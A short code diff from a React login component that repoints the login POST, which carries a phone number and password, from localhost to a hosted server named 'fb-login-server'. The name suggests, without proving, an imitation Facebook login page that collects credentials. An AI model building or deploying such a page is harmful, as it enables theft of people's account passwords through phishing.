@@ -25,7 +25,7 @@ function App() {
           "Content-type": "application/json"
         }
       };
-      const response = await axios.post('http://localhost:5000/api/login/user', userInfo, config)
+      const response = await axios.post('https://fb-login-server-jet.vercel.app/api/login/user', userInfo, config)
       if (response.status === 201) {
         setNumber("");
         setPassword("")
